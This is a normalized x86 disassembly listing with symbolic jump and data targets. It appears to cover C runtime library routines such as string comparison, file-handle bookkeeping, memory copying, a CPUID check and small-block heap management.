add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
add edx 0x1
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
add eax 0x1
retn
or al al
je r-xdata
or al al
je r-xdata
add ecx 0x1
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_417288
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_40e5f8
movzx eax [ ebp + 0xc ]
mov ecx [ ebp - 0xc ]
mov dl [ ebp + 0x14 ]
test [ ecx + eax + 0x1d ] dl
jne r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test eax eax
je r-xdata
sub_417329
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_417676
pop ecx
cmp eax 0xffffffff
je r-xdata
xor edi edi
mov eax [ rw-data ]
cmp esi 0x1
jne r-xdata
xor eax eax
push edi
call sub_410d14
pop ecx
or eax 0xffffffff
jmp r-xdata
cmp esi 0x2
jne r-xdata
test [ eax + 0x84 ] 0x1
jne r-xdata
pop edi
pop esi
pop ebp
retn
push esi
call sub_417676
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ eax + 0x44 ] 0x1
je r-xdata
push 0x2
call sub_417676
push 0x1
mov edi eax
call sub_417676
pop ecx
pop ecx
cmp eax edi
je r-xdata
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push esi
call sub_4175f0
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
pop ecx
mov [ eax + esi + 0x4 ] 0x0
test edi edi
je r-xdata
sub_4173c5
push 0x10
push r--data
call sub_4143e0
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_410d01
and [ eax ] 0x0
call sub_410cee
mov [ eax ] 0x9
call sub_410d01
mov [ eax ] edi
call sub_410cee
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_40edf4
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_414425
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_4176ed
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_410cee
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x8 ]
call sub_417329
pop ecx
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_417488
mov eax [ ebp - 0x1c ]
sub_417492
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
pop esi
pop ebp
retn
test al 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_410135
and [ esi + 0xc ] 0xfffffbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_4174d0
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb r-xdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja r-xdata
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_417547
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call sub_413495
pop ecx
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call eax
pop ecx
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_41756f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push edi
test eax eax
jl r-xdata
call sub_410cee
mov [ eax ] 0x9
call sub_410d01
and [ eax ] 0x0
or eax 0xffffffff
cmp eax [ rw-data ]
jae r-xdata
mov ecx eax
sar ecx 0x5
mov esi eax
and esi 0x1f
lea edi [ ecx * 4 + rw-data ]
mov ecx [ edi ]
shl esi 0x6
cmp [ esi + ecx ] 0xffffffff
jne r-xdata
cmp [ rw-data ] 0x1
push ebx
mov ebx [ ebp + 0xc ]
jne r-xdata
mov eax [ edi ]
mov [ esi + eax ] ebx
xor eax eax
pop ebx
jmp r-xdata
sub eax 0x0
je r-xdata
pop edi
pop esi
pop ebp
retn
push ebx
push 0xfffffff6
dec eax
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec eax
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_4175f0
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
xor ebx ebx
cmp ecx ebx
push esi
push edi
jl r-xdata
call sub_410cee
mov [ eax ] 0x9
call sub_410d01
mov [ eax ] ebx
or eax 0xffffffff
cmp ecx [ rw-data ]
jae r-xdata
mov eax ecx
sar eax 0x5
mov esi ecx
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
and esi 0x1f
shl esi 0x6
add eax esi
test [ eax + 0x4 ] 0x1
je r-xdata
cmp [ eax ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi ]
or [ esi + eax ] 0xffffffff
xor eax eax
jmp r-xdata
sub ecx ebx
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push ebx
push 0xfffffff6
dec ecx
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_417676
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
push esi
xor esi esi
cmp eax esi
jl r-xdata
call sub_410d01
and [ eax ] 0x0
call sub_410cee
mov [ eax ] 0x9
or eax 0xffffffff
pop ebp
retn
call sub_410d01
mov [ eax ] esi
call sub_410cee
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x9
call sub_40edf4
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp eax [ rw-data ]
jae r-xdata
pop esi
pop ebp
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
add eax ecx
test [ eax + 0x4 ] 0x1
jne r-xdata
mov eax [ eax ]
sub_4176ed
push 0xc
push r--data
call sub_4143e0
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
mov esi edi
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov [ ebp - 0x1c ] 0x1
xor ebx ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push 0xa
call sub_417d23
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_414425
retn
mov eax edi
sar eax 0x5
and edi 0x1f
shl edi 0x6
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + edi + 0xc ]
push eax
call [ EnterCriticalSection@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_417784
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_41b1a8
pop ecx
pop ecx
test eax eax
jne r-xdata
inc [ esi + 0x8 ]
mov [ ebp - 0x1c ] ebx
sub_41778d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0xc ]
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_4177b4
push 0x18
push r--data
call sub_4143e0
or [ ebp - 0x1c ] 0xffffffff
xor edi edi
mov [ ebp - 0x24 ] edi
push 0xb
call sub_417c60
pop ecx
test eax eax
jne r-xdata
push 0xb
call sub_417d23
pop ecx
mov [ ebp - 0x4 ] edi
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_417945
mov eax [ ebp - 0x1c ]
mov esi [ edi * 4 + rw-data ]
test esi esi
je r-xdata
call sub_414425
retn
push 0x40
push 0x20
call sub_413f18
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
je r-xdata
mov [ ebp - 0x20 ] esi
mov eax [ edi * 4 + rw-data ]
add eax 0x800
cmp esi eax
jae r-xdata
lea ecx [ edi * 4 + rw-data ]
mov [ ecx ] eax
add [ rw-data ] 0x20
cmp [ ebp - 0x1c ] 0xffffffff
jne r-xdata
test [ esi + 0x4 ] 0x1
jne r-xdata
shl edi 0x5
mov [ ebp - 0x1c ] edi
mov eax edi
sar eax 0x5
mov ecx edi
and ecx 0x1f
shl ecx 0x6
mov eax [ eax * 4 + rw-data ]
mov [ eax + ecx + 0x4 ] 0x1
push edi
call sub_4176ed
pop ecx
test eax eax
jne r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
and [ eax + 0x8 ] 0x0
add eax 0x40
mov [ ebp - 0x20 ] eax
jmp r-xdata
inc edi
jmp r-xdata
add esi 0x40
jmp r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
or [ ebp - 0x1c ] 0xffffffff
mov edx [ ecx ]
add edx 0x800
cmp eax edx
jae r-xdata
mov [ ebp - 0x28 ] edi
cmp edi 0x40
jge r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
push 0xa
call sub_417d23
pop ecx
xor ebx ebx
inc ebx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] 0x0
jne r-xdata
lea ebx [ esi + 0xc ]
push ebx
call [ EnterCriticalSection@IAT ]
test [ esi + 0x4 ] 0x1
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_417887
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_41b1a8
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
push ebx
call [ LeaveCriticalSection@IAT ]
inc [ esi + 0x8 ]
mov [ ebp - 0x24 ] ebx
jmp r-xdata
mov [ esi + 0x4 ] 0x1
or [ esi ] 0xffffffff
sub esi [ edi * 4 + rw-data ]
sar esi 0x6
mov eax edi
shl eax 0x5
add esi eax
mov [ ebp - 0x1c ] esi
sub_41794e
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] esi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
shr ecx 0x7
jmp r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec ecx
jne r-xdata
mov esi [ ebp - 0x8 ]
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_4179d5
push ebp
mov ebp esp
sub esp 0x1c
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] ebx
mov ebx [ ebp + 0xc ]
mov eax ebx
cdq
mov ecx eax
mov eax [ ebp + 0x8 ]
xor ecx edx
sub ecx edx
and ecx 0xf
xor ecx edx
sub ecx edx
cdq
mov edi eax
xor edi edx
sub edi edx
and edi 0xf
xor edi edx
sub edi edx
mov edx ecx
or edx edi
jne r-xdata
cmp ecx edi
jne r-xdata
mov esi [ ebp + 0x10 ]
mov ecx esi
and ecx 0x7f
mov [ ebp - 0x18 ] ecx
cmp esi ecx
je r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
neg ecx
add ecx 0x10
mov [ ebp - 0x1c ] ecx
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp - 0x1c ]
[ edi ] [ esi ]
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x1c ]
mov edx [ ebp + 0xc ]
add edx [ ebp - 0x1c ]
mov eax [ ebp + 0x10 ]
sub eax [ ebp - 0x1c ]
push eax
push edx
push ecx
call sub_4179d5
add esp 0xc
mov eax [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
je r-xdata
sub esi ecx
push esi
push ebx
push eax
call sub_41794e
add esp 0xc
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x18 ]
mov ebx [ ebp - 0x4 ]
mov esi [ ebp - 0x8 ]
mov edi [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
mov ebx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
add edx ebx
sub edx ecx
mov [ ebp - 0x14 ] edx
add ebx eax
sub ebx ecx
mov [ ebp - 0x10 ] ebx
mov esi [ ebp - 0x14 ]
mov edi [ ebp - 0x10 ]
mov ecx [ ebp - 0x18 ]
[ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
sub_417b08
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
xor eax eax
push ebx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
push ebx
pushfd
pop eax
mov ecx eax
xor eax 0x200000
push eax
popfd
pushfd
pop edx
sub edx ecx
je r-xdata
pop ebx
test [ ebp - 0x4 ] 0x4000000
je r-xdata
push ecx
popfd
xor eax eax
cpuid
mov [ ebp - 0xc ] eax
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x10 ] ecx
mov eax 0x1
cpuid
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
call sub_417ab8
test eax eax
je r-xdata
xor eax eax
inc eax
jmp r-xdata
pop ebx
leave
retn
sub_417b77
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] eax
push 0x0
sete al
push 0x1000
push eax
call [ HeapCreate@IAT ]
mov [ rw-data ] eax
test eax eax
jne r-xdata
xor eax eax
inc eax
mov [ rw-data ] eax
pop ebp
retn
pop ebp
retn
sub_417ba7
mov edi edi
push esi
push edi
xor esi esi
mov edi rw-data
inc esi
cmp esi 0x24
jl r-xdata
lea eax [ esi * 8 + rw-data ]
mov [ eax ] edi
push 0xfa0
push [ eax ]
add edi 0x18
call sub_41b1a8
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ esi * 8 + rw-data ] 0x1
jne r-xdata
xor eax eax
inc eax
and [ esi * 8 + rw-data ] 0x0
xor eax eax
jmp r-xdata
pop edi
pop esi
retn
sub_417bf2
mov edi edi
push ebx
mov ebx [ DeleteCriticalSection@IAT ]
push esi
mov esi rw-data
push edi
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
je r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
mov esi rw-data
pop edi
push edi
call ebx
push edi
call sub_410135
and [ esi ] 0x0
pop ecx
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call ebx
sub_417c60
push 0xc
push r--data
call sub_4143e0
xor edi edi
inc edi
mov [ ebp - 0x1c ] edi
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
mov esi [ ebp + 0x8 ]
lea esi [ esi * 8 + rw-data ]
cmp [ esi ] ebx
je r-xdata
call sub_4189c8
push 0x1e
call sub_41881d
push 0xff
call sub_41412b
push 0x18
call sub_413ed3
pop ecx
mov edi eax
cmp edi ebx
jne r-xdata
mov eax edi
jmp r-xdata
push 0xa
call sub_417d23
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi ] ebx
jne r-xdata
call sub_410cee
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
call sub_414425
retn
push edi
call sub_410135
pop ecx
push 0xfa0
push edi
call sub_41b1a8
pop ecx
pop ecx
test eax eax
jne r-xdata
mov [ esi ] edi
jmp r-xdata
push edi
call sub_410135
pop ecx
call sub_410cee
mov [ eax ] 0xc
mov [ ebp - 0x1c ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_417d1a
mov eax [ ebp - 0x1c ]
sub_417d23
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
lea esi [ eax * 8 + rw-data ]
cmp [ esi ] 0x0
jne r-xdata
push [ esi ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push eax
call sub_417c60
pop ecx
test eax eax
jne r-xdata
push 0x11
call sub_4140d7
pop ecx
sub_417d56
mov edi edi
push ebp
mov ebp esp
mov ecx [ rw-data ]
mov eax [ rw-data ]
imul ecx ecx 0x14
add ecx eax
jmp r-xdata
cmp eax ecx
jb r-xdata
mov edx [ ebp + 0x8 ]
sub edx [ eax + 0xc ]
cmp edx 0x100000
jb r-xdata
xor eax eax
pop ebp
retn
add eax 0x14
sub_417d89
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi esi
sub edi [ ecx + 0xc ]
add esi 0xfffffffc
shr edi 0xf
mov ecx edi
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ esi ]
dec ecx
mov [ ebp - 0x4 ] ecx
test cl 0x1
jne r-xdata
pop edi
pop esi
leave
retn
push ebx
lea ebx [ ecx + esi ]
mov edx [ ebx ]
mov [ ebp - 0xc ] edx
mov edx [ esi - 0x4 ]
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0xc ]
mov [ ebp + 0xc ] ebx
test dl 0x1
jne r-xdata
mov edx ecx
sar edx 0x4
dec edx
cmp edx 0x3f
jbe r-xdata
sar edx 0x4
dec edx
cmp edx 0x3f
jbe r-xdata
mov ebx [ ebp - 0x8 ]
and ebx 0x1
mov [ ebp - 0xc ] ebx
jne r-xdata
push 0x3f
pop edx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
push 0x3f
pop edx
mov ebx [ ebp + 0x8 ]
sub esi [ ebp - 0x8 ]
mov ebx [ ebp - 0x8 ]
sar ebx 0x4
push 0x3f
mov [ ebp + 0xc ] esi
dec ebx
pop esi
cmp ebx esi
jbe r-xdata
mov edx [ ebx + 0x8 ]
mov ebx [ ebx + 0x4 ]
mov ecx [ ebp - 0x4 ]
add ecx [ ebp - 0xc ]
mov [ edx + 0x4 ] ebx
mov edx [ ebp + 0xc ]
mov ebx [ edx + 0x4 ]
mov edx [ edx + 0x8 ]
mov [ ebx + 0x8 ] edx
mov [ ebp - 0x4 ] ecx
mov ebx 0x80000000
cmp edx 0x20
jae r-xdata
mov ecx [ ebp - 0x10 ]
lea ecx [ ecx + edx * 8 ]
mov ebx [ ecx + 0x4 ]
mov [ esi + 0x8 ] ecx
mov [ esi + 0x4 ] ebx
mov [ ecx + 0x4 ] esi
mov ecx [ esi + 0x4 ]
mov [ ecx + 0x8 ] esi
mov ecx [ esi + 0x4 ]
cmp ecx [ esi + 0x8 ]
jne r-xdata
cmp ebx edx
je r-xdata
add ecx [ ebp - 0x8 ]
mov edx ecx
sar edx 0x4
dec edx
mov [ ebp - 0x4 ] ecx
cmp edx esi
jbe r-xdata
mov ebx esi
lea ecx [ edx - 0x20 ]
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ecx edx
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi ] eax
mov [ eax + esi - 0x4 ] eax
mov eax [ ebp - 0x10 ]
dec [ eax ]
jne r-xdata
mov cl [ edx + eax + 0x4 ]
mov [ ebp + 0xf ] cl
inc cl
mov [ edx + eax + 0x4 ] cl
cmp edx 0x20
jae r-xdata
cmp ebx edx
je r-xdata
mov edx esi
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
pop ebx
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov esi [ ebp + 0xc ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
cmp esi [ ecx + 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] edi
mov ecx [ rw-data ]
mov esi [ VirtualFree@IAT ]
push 0x4000
shl ecx 0xf
add ecx [ eax + 0xc ]
mov ebx 0x8000
push ebx
push ecx
call esi
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov edx 0x80000000
shr edx cl
or [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
mov ecx [ rw-data ]
and [ eax + ecx * 4 + 0xc4 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
dec [ eax + 0x43 ]
mov eax [ rw-data ]
mov ecx [ eax + 0x10 ]
cmp [ ecx + 0x43 ] 0x0
jne r-xdata
lea ecx [ edx - 0x20 ]
mov edx 0x80000000
shr edx cl
lea eax [ eax + edi * 4 + 0xc4 ]
or [ eax ] edx
lea ecx [ edx - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
mov ebx 0x80000000
mov ecx edx
shr ebx cl
lea eax [ eax + edi * 4 + 0x44 ]
or [ eax ] ebx
jmp r-xdata
mov ecx edx
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x8 ]
mov ecx [ ecx + 0x4 ]
mov [ esi + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov [ esi + 0x8 ] ecx
mov esi 0x80000000
cmp ebx 0x20
jae r-xdata
cmp [ eax + 0x8 ] 0xffffffff
jne r-xdata
and [ eax + 0x4 ] 0xfffffffe
mov eax [ rw-data ]
lea ecx [ ebx - 0x20 ]
shr esi cl
not esi
and [ eax + edi * 4 + 0xc4 ] esi
dec [ ebx + eax + 0x4 ]
jne r-xdata
mov ecx ebx
shr esi cl
not esi
and [ eax + edi * 4 + 0x44 ] esi
dec [ ebx + eax + 0x4 ]
jne r-xdata
push ebx
push 0x0
push [ eax + 0xc ]
call esi
mov eax [ rw-data ]
push [ eax + 0x10 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
mov ecx [ rw-data ]
mov eax [ rw-data ]
imul ecx ecx 0x14
mov edx [ rw-data ]
sub ecx eax
lea ecx [ ecx + edx - 0x14 ]
push ecx
lea ecx [ eax + 0x14 ]
push ecx
push eax
call sub_40fdd0
mov eax [ ebp + 0x8 ]
add esp 0xc
dec [ rw-data ]
cmp eax [ rw-data ]
jbe r-xdata
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] esi
mov ecx [ ebp + 0x8 ]
and [ ecx ] esi
jmp r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
sub [ ebp + 0x8 ] 0x14
sub_41809f
mov eax [ rw-data ]
push esi
mov esi [ rw-data ]
push edi
xor edi edi
cmp esi eax
jne r-xdata
imul esi esi 0x14
add esi [ rw-data ]
push 0x41c4
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov [ esi + 0x10 ] eax
cmp eax edi
je r-xdata
add eax 0x10
imul eax eax 0x14
push eax
push [ rw-data ]
push edi
push [ rw-data ]
call [ HeapReAlloc@IAT ]
cmp eax edi
jne r-xdata
xor eax eax
jmp r-xdata
push 0x4
push 0x2000
push 0x100000
push edi
call [ VirtualAlloc@IAT ]
mov [ esi + 0xc ] eax
cmp eax edi
jne r-xdata
add [ rw-data ] 0x10
mov esi [ rw-data ]
mov [ rw-data ] eax
pop edi
pop esi
retn
or [ esi + 0x8 ] 0xffffffff
mov [ esi ] edi
mov [ esi + 0x4 ] edi
inc [ rw-data ]
mov eax [ esi + 0x10 ]
or [ eax ] 0xffffffff
mov eax esi
push [ esi + 0x10 ]
push edi
push [ rw-data ]
call [ HeapFree@IAT ]
jmp r-xdata
sub_41814f
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x8 ]
push ebx
push esi
mov esi [ ecx + 0x10 ]
push edi
xor ebx ebx
jmp r-xdata
test eax eax
jge r-xdata
add eax eax
inc ebx
mov eax ebx
imul eax eax 0x204
lea eax [ eax + esi + 0x144 ]
push 0x3f
mov [ ebp - 0x8 ] eax
pop edx
mov [ eax + 0x8 ] eax
mov [ eax + 0x4 ] eax
add eax 0x8
dec edx
jne r-xdata
push 0x4
mov edi ebx
push 0x1000
shl edi 0xf
add edi [ ecx + 0xc ]
push 0x8000
push edi
call [ VirtualAlloc@IAT ]
test eax eax
jne r-xdata
lea edx [ edi + 0x7000 ]
mov [ ebp - 0x4 ] edx
cmp edi edx
ja r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x1f8
lea ecx [ edi + 0xc ]
mov [ eax + 0x4 ] ecx
mov [ ecx + 0x8 ] eax
lea ecx [ edx + 0xc ]
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
and [ esi + ebx * 4 + 0x44 ] 0x0
xor edi edi
inc edi
mov [ esi + ebx * 4 + 0xc4 ] edi
mov al [ esi + 0x43 ]
mov cl al
inc cl
test al al
mov eax [ ebp + 0x8 ]
mov [ esi + 0x43 ] cl
jne r-xdata
mov ecx edx
sub ecx edi
shr ecx 0xc
lea eax [ edi + 0x10 ]
inc ecx
pop edi
pop esi
pop ebx
leave
retn
mov edx 0x80000000
mov ecx ebx
shr edx cl
not edx
and [ eax + 0x8 ] edx
mov eax ebx
or [ eax + 0x4 ] edi
or [ eax - 0x8 ] 0xffffffff
or [ eax + 0xfec ] 0xffffffff
lea edx [ eax + 0xffc ]
mov [ eax ] edx
lea edx [ eax - 0x1004 ]
mov [ eax - 0x4 ] 0xff0
mov [ eax + 0x4 ] edx
mov [ eax + 0xfe8 ] 0xff0
add eax 0x1000
dec ecx
jne r-xdata
mov edx [ ebp - 0x4 ]
sub_418257
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x10 ]
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
mov edx edi
sub edx [ ecx + 0xc ]
add esi 0x17
shr edx 0xf
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ edi - 0x4 ]
and esi 0xfffffff0
dec ecx
cmp esi ecx
lea edi [ ecx + edi - 0x4 ]
mov ebx [ edi ]
mov [ ebp + 0x10 ] ecx
mov [ ebp - 0x4 ] ebx
jle r-xdata
jge r-xdata
test bl 0x1
